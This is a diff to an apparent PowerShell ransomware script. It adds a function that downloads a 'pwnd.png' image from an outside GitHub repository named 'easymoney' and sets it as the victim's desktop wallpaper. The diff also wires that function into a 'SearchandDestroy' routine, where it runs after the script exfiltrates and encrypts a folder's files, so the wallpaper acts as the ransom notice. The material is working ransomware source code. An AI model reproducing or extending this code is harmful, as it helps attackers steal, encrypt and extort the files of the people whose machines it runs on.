@@ -258,6 +258,57 @@ function Exfiltrate
 
 } 
 
+function Set-DesktopWallpaper {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$url,
+
+        [Parameter(Mandatory=$false)]
+        [ValidateSet("Fill","Fit","Stretch","Tile","Center","Span")]
+        [string]$Style = "Fill"
+    )
+
+    $wallpaperPath="$env:TEMP\pwnd.png";
+    (New-Object System.Net.WebClient).DownloadFile($url,$wallpaperPath)
+    
+    $resolved = (Resolve-Path $wallpaperPath).ProviderPath
+
+    $styleMap = @{
+        "Fill"    = @{WallpaperStyle='10'; Tile='0'}
+        "Fit"     = @{WallpaperStyle='6';  Tile='0'}
+        "Stretch" = @{WallpaperStyle='2';  Tile='0'}
+        "Tile"    = @{WallpaperStyle='0';  Tile='1'}
+        "Center"  = @{WallpaperStyle='0';  Tile='0'}
+        "Span"    = @{WallpaperStyle='22'; Tile='0'}
+    }
+
+    $vals = $styleMap[$Style]
+
+    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value $vals.WallpaperStyle -ErrorAction Stop
+    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name TileWallpaper   -Value $vals.Tile           -ErrorAction Stop
+
+    $source = @'
+using System.Runtime.InteropServices;
+public static class NativeMethods {
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+}
+'@
+
+    Add-Type -TypeDefinition $source -Language CSharp -ErrorAction Stop
+
+    $SPI_SETDESKWALLPAPER = 0x0014
+    $SPIF_UPDATEINIFILE = 0x0001
+    $SPIF_SENDWININICHANGE = 0x0002
+    $flags = $SPIF_UPDATEINIFILE -bor $SPIF_SENDWININICHANGE
+
+    $success = [NativeMethods]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $resolved, $flags)
+    if (-not $success) {
+        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        throw "Failed to set wallpaper (Win32 error $err)"
+    }
+}
 
 function SearchandDestroy
 {
@@ -269,7 +320,8 @@ function SearchandDestroy
     $FolderPath = Validate-Path -Path $FolderPath -Type Folder
 
     Exfiltrate -FolderPath $FolderPath
-    Encrypt -FolderPath $FolderPath
+    Encrypt -FolderPath $FolderPath   
+    Set-DesktopWallpaper -Url "https://github.com/bsoroudi/easymoney/blob/updates/IMG_1747.PNG?raw=true" -Style Fill
     
 }
 
